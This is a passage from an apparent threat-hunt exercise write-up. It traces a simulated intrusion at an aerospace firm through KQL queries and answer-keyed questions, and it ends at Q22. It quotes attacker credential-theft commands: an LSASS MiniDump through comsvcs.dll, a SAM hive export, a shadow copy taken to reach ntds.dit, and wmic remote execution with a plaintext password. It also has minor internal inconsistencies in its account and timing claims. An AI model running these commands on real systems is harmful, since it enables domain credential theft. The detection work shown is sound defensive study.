# Operation Silent Corridor — Threat Hunt Report
### Haldric Aerospace // Engineering Segment // 
---

## 🌟 Table of Contents

- [🌍 Scenario](#scenario)
- [🎯 Mission](#mission)
- [🚩 Q00 — Environment Access](#q00---environment-access)
- [🚩 Q01 — Suspicious Account](#q01---suspicious-account)
- [🚩 Q02 — Origin of Failed Auth](#q02---origin-of-failed-auth)
- [🚩 Q03 — Connection Footprint](#q03---connection-footprint)
- [🚩 Q04 — Source Address Inventory](#q04---source-address-inventory)
- [🚩 Q05 — Internal Landing Point](#q05---internal-landing-point)
- [🚩 Q06 — Initial Process](#q06---initial-process)
- [🚩 Q07 — Directory Enumeration](#q07---directory-enumeration)
- [🚩 Q08 — Network Reconnaissance](#q08---network-reconnaissance)
- [🚩 Q09 — First Credential Activity](#q09---first-credential-activity)
- [🚩 Q10 — Credential Dump Outcome](#q10---credential-dump-outcome)
- [🚩 Q11 — Stored Credential Source](#q11---stored-credential-source)
- [🚩 Q12 — Saved Credentials](#q12---saved-credentials)
- [🚩 Q13 — First Lateral Pivot](#q13---first-lateral-pivot)
- [🚩 Q14 — New Account Observed](#q14---new-account-observed)
- [🚩 Q15 — Cross-Host Spawning](#q15---cross-host-spawning)
- [🚩 Q16 — New Filesystem Activity](#q16---new-filesystem-activity)
- [🚩 Q17 — Critical File](#q17---critical-file)
- [🚩 Q18 — Concurrent File Access](#q18---concurrent-file-access)
- [🚩 Q19 — Database File Access](#q19---database-file-access)
- [🚩 Q20 — Spawning Source](#q20---spawning-source)
- [🚩 Q21 — RDP Scope](#q21---rdp-scope)
- [🚩 Q22 — Network Configuration Change](#q22---network-configuration-change)
- [🚩 Q23 — Configuration Storage](#q23---configuration-storage)
- [🚩 Q24 — Matching Configuration on DC](#q24---matching-configuration-on-dc)
- [🚩 Q25 — Targeted Directory](#q25---targeted-directory)
- [🚩 Q26 — Packaged Output](#q26---packaged-output)
- [🚩 Q27 — Compression Method](#q27---compression-method)
- [🚩 Q28 — Format Conversion](#q28---format-conversion)
- [🚩 Q29 — Outbound Transfer](#q29---outbound-transfer)
- [🚩 Q30 — External Destination](#q30---external-destination)
- [🚩 Q31 — Reentry Window](#q31---reentry-window)
- [🚩 Q32 — First Cleanup Action](#q32---first-cleanup-action)
- [🚩 Q33 — Clearing Method Analysis](#q33---clearing-method-analysis)
- [🚩 Q34 — Surviving Log Source](#q34---surviving-log-source)
- [🚩 Q35 — Exfiltration Confidence Call](#q35---exfiltration-confidence-call)
- [🚩 Q36 — DC Staging Cleanup](#q36---dc-staging-cleanup)
- [🚩 Q37 — CISO Brief](#q37---ciso-brief)
- [📊 Conclusion, Investigation Timeline & Key Findings](#conclusion-investigation-timeline--key-findings)
- [🛡️ MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [🛠️ Remediation](#remediation)

---

<a id="scenario"></a>
## 🌍 Scenario

Haldric Aerospace is a Tier 2 defence contractor specialising in avionics navigation systems for European military programmes. Engineering staff operate from a dedicated network segment with remote access via SSL VPN. The company employs approximately 200 staff across three sites.

The BfV — Germany's domestic intelligence service — issued a confidential advisory to defence sector organisations. A state-sponsored actor designated **GREY VEIL** has been conducting intrusions against European aerospace and defence contractors since late 2025. Their primary objectives are intellectual property theft and persistent access to engineering networks. Previous victims reported **extended dwell times** before detection. No custom tooling. No malware detections. No endpoint alerts. Traditional detection failed every time.

K. Hofmann, CISO of Haldric Aerospace, commissioned a proactive hunt across the engineering segment.

No alerts have fired. No incident ticket exists.

Find them before they're done.

<a id="mission"></a>
## 🎯 Mission

Hunt through Microsoft Sentinel telemetry unified in the custom table `SilentCorridorX_CL`, analyse authentication anomalies, reconstruct attacker sessions, pivot across hosts using parent-process correlation, and determine whether GREY VEIL has accessed Haldric Aerospace infrastructure — and if so, what they took.

**Hunt Environment:**
- 🖥️ Workspace: `LAW-SilentCorridor`
- 📋 Table: `SilentCorridorX_CL`
- 📊 Events: 8,538
- 🕐 Time Window: 20 Feb — 5 Mar 2026
- 🏢 Target: Haldric Aerospace // Engineering Segment

---

<a id="q01---suspicious-account"></a>
# 🚩 Q00 — Environment Access

**Objective:**  
Confirm access to the Sentinel workspace. Identify the custom log table that unifies MDE and FortiGate telemetry for this hunt.

**What to Hunt:**  
List custom tables in the workspace and verify the one that contains the combined dataset for Operation Silent Corridor.

All hunt queries in this report are executed against this unified table.

---

### ✅ Q00 Answer: `SilentCorridorX_CL`

---

<a id="q01---suspicious-account"></a>
# 🚩 Q01 — Suspicious Account

**Objective:**
Identify the account that doesn't fit — the one that deviates from normal authentication patterns and represents the adversary's foothold.

**What to Hunt:**
Profile every account in the VPN and logon data. Look for anomalies in login times, source IPs, session durations, or frequency that differ from established baselines.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceLogonEvents"
| where RemoteDeviceName == "kali"
| project EventTime, AccountDomain, AccountName, ActionType, DeviceName, LogonProcess, RemoteDeviceName, RemoteIP
| sort by EventTime desc
```

![[Pasted image 20260513142023.png]]

Starting the hunt at the VPN layer — as every previous GREY VEIL intrusion began at remote access infrastructure — I queried `DeviceLogonEvents` for accounts authenticating via NTLM from a suspicious remote device. The device name `kali` immediately stood out: it is the name of a well-known penetration testing Linux distribution and has no legitimate place in a corporate engineering environment. Filtering on `RemoteDeviceName == "kali"` surfaced all sessions originating from the adversary's attack machine.

The results showed repeated successful NTLM logons (`NtLmSsp`) across multiple hosts under a single account — `s.brandt` — on `WS-ENG04`, `SRV-FILES02`, and `SRV-DC01`, spanning the entire hunt window. No other account exhibited this pattern. This confirmed `s.brandt` as the compromised account serving as the adversary's primary identity inside the HALDRIC domain.

| #   | Event Time (UTC)    | Account   | Device      |
| --- | ------------------- | --------- | ----------- |
| 1   | 2026-02-24 11:37:43 | s.brandt  | WS-ENG04    |
| 2   | 2026-02-25 13:00:00 | s.brandt  | WS-ENG04    |
| 3   | 2026-02-25 14:07:13 | s.brandt  | WS-ENG04    |
| 4   | 2026-02-26 13:42:18 | s.brandt  | WS-ENG04    |
| 5   | 2026-02-27 14:04:16 | s.brandt  | WS-ENG04    |
| 6   | 2026-02-28 03:16:21 | m.richter | SRV-FILES02 |
| 7   | 2026-02-28 04:17:24 | m.richter | SRV-DC01    |
| 8   | 2026-03-02 11:04:16 | s.brandt  | WS-ENG04    |
| 9   | 2026-03-03 12:32:08 | s.brandt  | WS-ENG04    |

---

### ✅ Q01 Answer: `s.brandt`

---

<a id="q02---origin-of-failed-auth"></a>
# 🚩 Q02 — Origin of Failed Auth

**Objective:**
Determine whether the account anomaly represents a compromised legitimate user or an external actor. Find the IP address that failed authentication before successfully gaining access.

**What to Hunt:**
Check the FortiGate VPN logs for failed login attempts against `s.brandt` before the first successful session. A failed attempt followed by a success from the same IP — especially at unusual hours — confirms credential stuffing or brute-force activity.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| project-reorder EventTime, AccountName, ActionType, DestinationHost, DeviceName, Message, Reason, RemoteIP, TunnelIP, TunnelType, VPNGroup
| sort by EventTime asc
```

![[Pasted image 20260513144944.png]]

Querying the `FortiGateVPN` table for all activity under `s.brandt` and sorting chronologically revealed the critical pre-access event. At **2026-02-19 23:47:12**, a failed VPN authentication (`ssl-login-fail`) was recorded from IP `185.220.101.34`. Approximately 2.5 hours later, at **2026-02-20 02:14:00**, the same IP successfully authenticated and established a VPN tunnel to destination host `WS-ENG04`.

This failed-then-succeeded pattern from `185.220.101.34` — at 23:47 and then 02:14 — outside business hours, from an IP later confirmed as Tor exit node infrastructure, proves this was not a legitimate employee. The adversary had obtained `s.brandt`'s credentials and was testing them against the VPN.

---

### ✅ Q02 Answer: `185.220.101.34`

---

<a id="q03---connection-footprint"></a>
# 🚩 Q03 — Connection Footprint

**Objective:**
Scope the full connection picture for the compromised account across the investigation window to understand attacker infrastructure diversity.

**What to Hunt:**
Count unique source IP addresses used by `s.brandt` across the entire 20 Feb — 5 Mar 2026 window.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| project EventTime, AccountName, ActionType, DestinationHost, RemoteIP, TunnelIP
| sort by EventTime asc
| distinct RemoteIP
```

![[Pasted image 20260513151432.png]]

The query returned 4 unique source IPs across the full hunt window. The diversity of IPs — spanning multiple anonymisation services — is consistent with GREY VEIL tradecraft: rotating exit nodes to avoid IP-based detection while maintaining persistent access to the same account.

---

### ✅ Q03 Answer: `4`

---

<a id="q04---source-address-inventory"></a>
# 🚩 Q04 — Source Address Inventory

**Objective:**
Document all source IPs for threat intelligence correlation and infrastructure attribution.

**What to Hunt:**
Pull every distinct source IP used by `s.brandt` across the investigation window, sorted by first octet.

Analysis of VPN session data across the full window revealed the following four source addresses:

| IP Address       | Assessment                                                    |
|------------------|---------------------------------------------------------------|
| `88.153.72.14`   | Most frequent; daytime hours — likely legitimate s.brandt     |
| `185.220.101.34` | Failed auth before first success; Tor exit node               |
| `91.234.33.126`  | Late-night sessions; anonymisation infrastructure             |
| `45.153.160.88`  | Mar 2 & Mar 4 early morning — attacker re-entry sessions      |

Three of the four IPs are confirmed anonymisation/Tor infrastructure. The fourth (`88.153.72.14`) exhibits normal business-hours patterns and is assessed as the legitimate employee's residential or office IP.

---

### ✅ Q04 Answer: `45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34`

---

<a id="q05---internal-landing-point"></a>
# 🚩 Q05 — Internal Landing Point

**Objective:**
Identify the internal host where the attacker's VPN sessions terminated — the beachhead for all subsequent operations.

**What to Hunt:**
Check the `DestinationHost` field in FortiGate VPN session records for the three attacker IPs identified above.

All three attacker-controlled IPs consistently established VPN sessions terminating at the same internal destination. The sessions from legitimate IP `88.153.72.14` used TunnelIP `10.20.10.101`, while all three attacker IPs used TunnelIP `10.1.96.114` — a different tunnel subnet, indicating the attacker may have been assigned to a different VPN group or the sessions were established under different conditions.

---

### ✅ Q05 Answer: `WS-ENG04`

---

<a id="q06---initial-process"></a>
# 🚩 Q06 — Initial Process

**Objective:**
Pivot to the beachhead and identify the first non-routine process executed under the adversary's session — and what spawned it.

**What to Hunt:**
Query `DeviceProcessEvents` on `WS-ENG04` for `s.brandt` sorted chronologically. The first suspicious process immediately after the 02:14 VPN login reveals what the attacker did first.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| project EventTime, AccountDomain, AccountName, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260513160813.png]]

At **2026-02-20 02:14:00** — the exact moment the first attacker VPN session connected — `systeminfo.exe` was executed under `s.brandt`'s session on `WS-ENG04`. The initiating (parent) process was `cmd.exe`.

`systeminfo` is a native Windows tool that outputs detailed host information including OS version, domain membership, hotfix history, network adapters, and memory. It is the classic first command an attacker runs immediately after gaining access: a rapid environmental survey to understand what they have landed on and plan next steps.

The process chain `cmd.exe → systeminfo.exe` is a textbook initial recon pattern. No legitimate user would run `systeminfo` at 02:14 AM.

---

### ✅ Q06 Answer: `systeminfo.exe/cmd.exe`

---

<a id="q07---directory-enumeration"></a>
# 🚩 Q07 — Directory Enumeration

**Objective:**
Identify what Active Directory groups the attacker enumerated to understand the domain privilege landscape.

**What to Hunt:**
Look for `net group` commands on the beachhead targeting AD groups. The attacker is building a map of who holds domain-level administrative access.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine has_any ("group", "dom")
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260513163537.png]]

The query returned two `net.exe` executions in sequence under `s.brandt` on `WS-ENG04`:

1. `net  group "Domain Admins" /dom` — enumerates all members of the Domain Admins group
2. `net  group "Enterprise Admins" /dom` — enumerates all members of the Enterprise Admins group

This is deliberate AD reconnaissance. By identifying who holds `Domain Admins` and `Enterprise Admins` membership, the adversary establishes a priority target list for credential theft. Accounts in these groups provide full domain and forest-level control — exactly what a threat actor targeting a defence contractor's intellectual property would need to reach sensitive file shares and domain infrastructure.

---

### ✅ Q07 Answer: `Domain Admins, Enterprise Admins`

---

<a id="q08---network-reconnaissance"></a>
# 🚩 Q08 — Network Reconnaissance

**Objective:**
Determine what internal infrastructure the attacker mapped after completing Active Directory reconnaissance.

**What to Hunt:**
Check DNS and network events from the beachhead. Look for WMIC.exe — a common LOLBin used for lateral movement — making outbound network connections to internal hosts.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceNetworkEvents"
| where InitiatingProcessFileName == "WMIC.exe"
| project EventTime, ActionType, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessFileName, LocalIP, LocalPort, RemoteIP, RemotePort, Protocol
| sort by EventTime asc
```

![[Pasted image 20260513191430.png|579]]

`WMIC.exe` making outbound network connections is immediately suspicious — it is a Windows management tool that has no legitimate reason to establish repeated TCP connections to internal hosts on high ephemeral ports. The results revealed connections to two internal IPs:

- `10.1.31.206` — contacted multiple times on port `53891`
- `10.1.70.42` — contacted on port `64347`

To resolve these IPs to hostnames, a second query pivoted on `LocalIP`:

```kql
HuntData
| where LocalIP in ("10.1.31.206", "10.1.70.42")
| distinct DeviceName, LocalIP
```

![[Pasted image 20260518184854.png]]

| IP           | Device Name   |
|--------------|---------------|
| `10.1.31.206` | `SRV-DC01`   |
| `10.1.70.42`  | `SRV-FILES02`|

The attacker mapped the **Domain Controller** and the **File Server** — the two highest-value targets in the environment. The DC holds all domain credentials; the file server holds engineering intellectual property.

---

### ✅ Q08 Answer: `SRV-DC01, SRV-FILES02`

---

<a id="q09---first-credential-activity"></a>
# 🚩 Q09 — First Credential Activity

**Objective:**
Identify the earliest evidence of credential-focused activity on the beachhead — the moment the adversary began targeting authentication infrastructure.

**What to Hunt:**
Look for commands targeting `lsass.exe` — the Windows Local Security Authority Subsystem Service, which handles all authentication on a Windows host. Identifying the LSASS process PID is the prerequisite step before any memory dump attempt.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260513192838.png]]

At **2026-02-26 02:38:49**, the adversary on `WS-ENG04` under `HALDRIC\s.brandt` executed `tasklist.exe` via `cmd.exe` with the command:

```
tasklist  /fi "imagename eq lsass.exe"
```

The `/fi` (filter) flag restricts output to processes matching the image name `lsass.exe`. This is a targeted query designed to retrieve the LSASS process ID (PID) — a necessary precursor to memory dumping. By knowing the exact PID, the attacker can reference the specific process in subsequent dump commands without guessing.

This represents the earliest confirmed credential access activity on the beachhead, occurring approximately 6 days after initial VPN access — consistent with GREY VEIL's documented pattern of extended dwell before moving to credential theft.

---

### ✅ Q09 Answer: `tasklist  /fi "imagename eq lsass.exe"`

---

<a id="q10---credential-dump-outcome"></a>
# 🚩 Q10 — Credential Dump Outcome

**Objective:**
Determine whether the LSASS memory dump attempt that followed the process enumeration succeeded or was blocked.

**What to Hunt:**
Find the dump command that followed the `tasklist` enumeration, then check `DeviceFileEvents` for the expected output file. If no file was written, the dump failed or was prevented.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceFileEvents"
| where DeviceName == "WS-ENG04"
| sort by EventTime asc
```

At **2026-02-26 02:40:03** — 71 seconds after the `tasklist` enumeration — the adversary executed a `rundll32.exe` LSASS dump attempt using the living-off-the-land technique:

```
rundll32.exe  C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full
```

This technique abuses the legitimate `comsvcs.dll` `MiniDump` export to create a full memory dump of the target process (PID 628 = LSASS) — generating no malware signature and requiring no external tools.

However, querying `DeviceFileEvents` for `sys_diag.dmp` returned **no results**. The expected output file was never written to disk. No intervening process (such as Defender) appears in the event data as blocking the attempt, but the absence of the file confirms the dump did not produce usable output. The adversary pivoted to alternative credential sources immediately after.

---

### ✅ Q10 Answer: `NO/none`

---

<a id="q11---stored-credential-source"></a>
# 🚩 Q11 — Stored Credential Source

**Objective:**
Identify what other credential store the adversary targeted on the beachhead after the LSASS dump failed.

**What to Hunt:**
Look for `reg.exe` commands with `save` arguments targeting Windows registry hives that store credential material.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where FileName == "reg.exe" and ProcessCommandLine contains "save"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260513200212.png]]

On **2026-02-27**, the adversary executed `reg.exe` twice on `WS-ENG04` via `cmd.exe`:

- **12:20:20** — `reg  save HKLM\SAM C:\Windows\Temp\sam.bak`
- **14:28:52** — `reg  save HKLM\SAM C:\Windows\Temp\sam.bak` *(repeated)*

The **SAM** (Security Account Manager) hive stores hashed passwords for all local accounts on the system. Exporting it allows offline password cracking without touching live LSASS memory. The repetition of the same command approximately two hours apart suggests the first attempt may not have produced a usable file, or the adversary sought to confirm the export before proceeding.

---

### ✅ Q11 Answer: `SAM`

---

<a id="q12---saved-credentials"></a>
# 🚩 Q12 — Saved Credentials

**Objective:**
Identify any additional credential enumeration activity on the beachhead beyond registry hive exporting.

**What to Hunt:**
Look for commands that enumerate saved credentials in the Windows Credential Manager — a store that can contain cached usernames and passwords for remote systems, including RDP sessions.

At **2026-02-27 11:04:16**, the adversary on `WS-ENG04` under `HALDRIC\s.brandt` executed `cmdkey.exe` via `cmd.exe`:

```
cmdkey  /list
```

![[Pasted image 20260513201436.png]]

`cmdkey /list` enumerates all credentials stored in the Windows Credential Manager — cached passwords for network shares, RDP targets, and web services. This activity follows the SAM hive export attempts, confirming the adversary was conducting a comprehensive sweep of all available credential sources on the beachhead before pivoting laterally.

---

### ✅ Q12 Answer: `cmdkey  /list`

---

<a id="q13---first-lateral-pivot"></a>
# 🚩 Q13 — First Lateral Pivot

**Objective:**
Reconstruct the first lateral movement event — the VPN tunnel active at that moment, the target host, and the account used.

**What to Hunt:**
The pivot command in `DeviceProcessEvents` names the target and credentials. Cross-reference `FortiGateVPN` by timestamp to identify which tunnel was active.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| project EventTime, AccountName, ActionType, DestinationHost, RemoteIP, TunnelIP
| sort by EventTime asc
```

![[Pasted image 20260513203633.png]]

At **2026-02-28 03:15:36**, the adversary on `WS-ENG04` under `s.brandt` executed:

```
wmic  /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT"  process list brief
```

This WMIC command authenticates to `SRV-DC01` using **stolen credentials** for `m.richter` with a plaintext password — `Haldric2025SecIT` — confirming that credential harvesting operations had succeeded. The `/node` argument specifies the remote target; `/user` and `/password` supply the stolen identity.

Cross-referencing FortiGate VPN logs at 03:15 on 2026-02-28 confirmed the active tunnel at that moment was `10.1.96.114` — the attacker-controlled tunnel, distinct from the legitimate `s.brandt` tunnel (`10.20.10.101`).

---

### ✅ Q13 Answer: `10.1.96.114/SRV-DC01/m.richter`

---

<a id="q14---new-account-observed"></a>
# 🚩 Q14 — New Account Observed

**Objective:**
Confirm which stolen account the adversary used for lateral movement, proving the credential theft was successful.

The WMIC command in Q13 explicitly authenticated using `m.richter` — a domain account with administrative access to `SRV-DC01`. This account name had not appeared in any prior adversary activity, confirming it was obtained through the credential harvesting operations on the beachhead (SAM export, LSASS dump attempt, Credential Manager enumeration).

---

### ✅ Q14 Answer: `m.richter`

---

<a id="q15---cross-host-spawning"></a>
# 🚩 Q15 — Cross-Host Spawning

**Objective:**
Confirm the mechanism by which commands are being executed on the target host without direct logon.

**What to Hunt:**
Check `DeviceProcessEvents` on the target hosts for commands with the WMIC tool as the initiating process name from the beachhead.

KQL query used : 
```
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine contains "/node"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260513210105.png]]

The adversary used `WMIC.exe` on `WS-ENG04` to remotely execute commands on `SRV-DC01` and `SRV-FILES02` without establishing an interactive RDP session. On the receiving hosts, commands appeared as children of `WmiPrvSE.exe` — the Windows Management Instrumentation Provider Service — which handles remote WMI requests. This is a well-known LOLBin lateral movement technique that generates minimal noise and blends with legitimate administrative traffic.

---

### ✅ Q15 Answer: `WMIC.exe`

---

<a id="q16---new-filesystem-activity"></a>
# 🚩 Q16 — New Filesystem Activity

**Objective:**
Identify new directories created on the Domain Controller as staging locations for credential material.

**What to Hunt:**
Check the filesystem on `SRV-DC01` for directories created during the attacker's lateral movement window — specifically in `C:\Windows\Temp` where attackers commonly stage data.

At **2026-02-28 03:16:53**, the adversary used WMIC from `WS-ENG04` to remotely create a new directory on `SRV-DC01` using stolen `m.richter` credentials:

```
cmd.exe /c mkdir C:\Windows\Temp\McAfee_Logs
```

![[Pasted image 20260513210917.png]]

The directory name `McAfee_Logs` is deliberate masquerading — it impersonates a legitimate antivirus log directory to avoid attracting attention during casual inspection. This is a staging location created specifically to receive the NTDS.dit credential database dump that followed.

---

### ✅ Q16 Answer: `C:\Windows\Temp\McAfee_Logs`

---

<a id="q17---critical-file"></a>
# 🚩 Q17 — Critical File

**Objective:**
Identify what was packaged into the fake McAfee staging directory and which account was responsible.

**What to Hunt:**
Query `DeviceFileEvents` on `SRV-DC01` filtering for the `McAfee_Logs` folder. Pivot to `DeviceProcessEvents` at the same timestamp to attribute the account.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceFileEvents"
| where DeviceName == "SRV-DC01"
| where FileName == "ntds.dit"
| project EventTime, ActionType, InitiatingProcessAccountName, InitiatingProcessAccountDomain, DeviceName, FileName, FolderPath, InitiatingProcessFileName
| sort by EventTime asc
```

![[Pasted image 20260515171321.png]]

At **2026-02-28 04:21:13**, the file `ntds.dit` was created in `C:\Windows\Temp\McAfee_Logs` on `SRV-DC01` under `HALDRIC\m.richter` via `cmd.exe`.

`ntds.dit` is the Active Directory database — it contains the password hashes of **every account in the domain**, including Domain Admins and service accounts. Possession of this file enables offline cracking of all domain credentials without further network interaction. This is among the most damaging single artefacts an adversary can obtain from a Windows domain environment.

---

### ✅ Q17 Answer: `ntds.dit/m.richter`

---

<a id="q18---concurrent-file-access"></a>
# 🚩 Q18 — Concurrent File Access

**Objective:**
Determine whether any other process interacted with the staged `ntds.dit` file immediately after creation.

**What to Hunt:**
Query `DeviceFileEvents` on `SRV-DC01` for the `ntds.dit` file and examine the `InitiatingProcessFileName` of any access events occurring within seconds of the file's creation.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceFileEvents"
| where DeviceName == "SRV-DC01"
| where FileName == "ntds.dit"
| project EventTime, ActionType, InitiatingProcessAccountName, DeviceName, FileName, FolderPath, InitiatingProcessFileName
| sort by EventTime asc
```

![[Pasted image 20260515173357.png]]

At **2026-02-28 04:21:52** — 39 seconds after `ntds.dit` was created — `MsMpEng.exe` (Microsoft Defender Antivirus engine) accessed the file. This confirms Defender detected and scanned the credential database shortly after creation. However, **no remediation action followed** — the file remained in place. This represents a critical detection capability gap: Defender saw the NTDS.dit staging but did not act on it, indicating either a policy misconfiguration or that the file was not flagged as malicious in isolation without the surrounding context.

---

### ✅ Q18 Answer: `MsMpEng.exe`

---

<a id="q19---database-file-access"></a>
# 🚩 Q19 — Database File Access

**Objective:**
Determine how the adversary obtained a copy of `ntds.dit` despite it being locked by the operating system while Active Directory services are running.

**What to Hunt:**
Look for Volume Shadow Copy operations on `SRV-DC01` — VSS is the only standard mechanism to copy locked files on a live Windows system.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515174135.png]]

At **2026-02-28 04:20:00**, `HALDRIC\m.richter` executed on `SRV-DC01` via `cmd.exe`:

```
vssadmin  create shadow /for=C:
```

`vssadmin create shadow` creates a Volume Shadow Copy — a snapshot of the C: drive at a point in time. The VSS snapshot contains a copy of `ntds.dit` that is **not locked**, because it captures the file state outside the live filesystem. The adversary then copied `ntds.dit` from the shadow volume into the `McAfee_Logs` staging directory. This is a standard technique for bypassing the OS file lock on the Active Directory database without stopping the AD service.

---

### ✅ Q19 Answer: `vssadmin.exe`

---

<a id="q20---spawning-source"></a>
# 🚩 Q20 — Spawning Source

**Objective:**
Identify what process is spawning commands on `SRV-DC01` and which host is triggering that spawning remotely.

**What to Hunt:**
Check `InitiatingProcessFileName` on all adversary commands executed on `SRV-DC01`. Then identify the originating host based on the WMIC lateral movement chain already established.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| project EventTime, AccountDomain, AccountName, DeviceName, FileName, InitiatingProcessFileName, ProcessCommandLine
| sort by EventTime asc
```

![[Pasted image 20260515175539.png]]

All adversary-initiated commands on `SRV-DC01` — the `mkdir`, `vssadmin`, `ntdsutil`, and `rmdir` operations — share a common parent process: `WmiPrvSE.exe` (Windows Management Instrumentation Provider Service). This process handles inbound WMI requests from remote systems. It spawns locally on the target but is triggered remotely.

The originating host is **`WS-ENG04`** — the beachhead — confirmed by the WMIC commands we observed earlier executing against `SRV-DC01` from `WS-ENG04` under `s.brandt`'s session.

---

### ✅ Q20 Answer: `WmiPrvSE.exe/WS-ENG04`

---

<a id="q21---rdp-scope"></a>
# 🚩 Q21 — RDP Scope

**Objective:**
Determine all hosts the adversary reached via the active VPN tunnel.

**What to Hunt:**
Filter `DeviceNetworkEvents` by the attacker's tunnel IP (`10.1.96.114`) as `RemoteIP` — this captures all inbound connections from the attacker's tunnel across all target hosts.

**KQL Query Used:**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06))
| where MdeTable == "DeviceNetworkEvents"
| where LocalIP == "10.1.96.114"
| project EventTime, ActionType, DeviceName, LocalIP, LocalPort, RemoteIP, RemotePort, Protocol
| sort by EventTime asc
| distinct DeviceName
```

![[Pasted image 20260515180736.png]]

The tunnel IP `10.1.96.114` was observed making connections to three distinct devices across the hunt window: the beachhead `WS-ENG04` (where the tunnel terminates), and both lateral movement targets `SRV-DC01` and `SRV-FILES02`. This confirms the full scope of the attacker's network reach via the single compromised VPN session.

---

### ✅ Q21 Answer: `SRV-DC01, SRV-FILES02, WS-ENG04`

---

<a id="q22---network-configuration-change"></a>
# 🚩 Q22 — Network Configuration Change

**Objective:**
